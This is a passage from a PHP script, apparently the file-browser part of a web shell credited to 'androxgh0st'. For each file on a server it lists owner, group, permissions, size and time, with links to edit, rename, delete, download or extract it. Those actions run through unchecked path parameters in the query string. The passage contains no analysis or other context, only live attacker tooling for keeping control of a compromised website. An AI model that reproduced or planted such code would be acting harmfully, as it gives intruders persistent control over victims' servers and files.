			} else {
				$size = $size. 'KB';
			}
			if(!is_file("$dir/$file")) continue;
			echo "<tr>";
			echo "<td class='td_home'><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='><a href='?act=view&dir=$dir&file=$dir/$file'>$file</a></td>";
			echo "<td class='td_home'><center>$ftype</center></td>";
			echo "<td class='td_home'><center>$size</center></td>";
			echo "<td class='td_home'><center>$ftime</center></td>";
			echo "<td class='td_home'><center>$fowner/$fgrp</center></td>";
			echo "<td class='td_home'><center>".w("$dir/$file",perms("$dir/$file"))."</center></td>";
			if(preg_match('/(tar.gz)|(tgz)$/', $file)) {
				echo "<td class='td_home' style='padding-left: 15px;'><a href='?do=extgz&dir=$dir&file=$dir/$file'>Extract</a> | <a href='?act=edit&dir=$dir&file=$dir/$file'>edit</a> | <a href='?act=rename&dir=$dir&file=$dir/$file'>rename</a> | <a href='?act=delete&dir=$dir&file=$dir/$file'>delete</a> | <a href='?act=download&dir=$dir&file=$dir/$file'>download</a></td>";
			} else {
				echo "<td class='td_home' style='padding-left: 15px;'><a href='?act=edit&dir=$dir&file=$dir/$file'>edit</a> | <a href='?act=rename&dir=$dir&file=$dir/$file'>rename</a> | <a href='?act=delete&dir=$dir&file=$dir/$file'>delete</a> | <a href='?act=download&dir=$dir&file=$dir/$file'>download</a></td>";
			}
			echo "</tr>";
		}
		echo "</table>";
		if(!is_readable($dir)) {
			//
		} else {
			echo "<hr>";
		}
	echo "<center>Copyright &copy; ".date("Y")." - <a href='http://localh0st.space/' target='_blank'><font color=lime>androxgh0st</font></a></center>";
}
?>
<hr>
</html>
